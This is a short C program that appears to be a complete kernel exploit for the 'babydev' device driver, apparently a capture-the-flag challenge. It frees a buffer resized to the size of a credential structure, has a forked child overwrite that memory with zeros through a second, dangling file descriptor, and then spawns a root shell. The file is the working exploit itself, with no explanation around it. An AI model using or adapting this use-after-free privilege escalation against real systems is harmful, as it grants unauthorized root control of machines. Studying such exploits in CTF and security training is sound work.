#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

#define COMMAND 0x10001

int main()
{
    int fd1 = open("/dev/babydev", O_RDWR);
    int fd2 = open("/dev/babydev", O_RDWR);

    ioctl(fd1, COMMAND, 168);
    close(fd1);

    int pid = fork();

    if (pid < 0)
    {
        printf("ERROR");
        exit(-1);
    }
    else if (pid == 0)
    {
        char fake_cred[30] = { 0, };

        write(fd2, fake_cred, 28);
        sleep(1);

        system("/bin/sh");
        exit(0);
    }
    else
    {
        wait(0);
    }

    close(fd2);

    return 0;
}
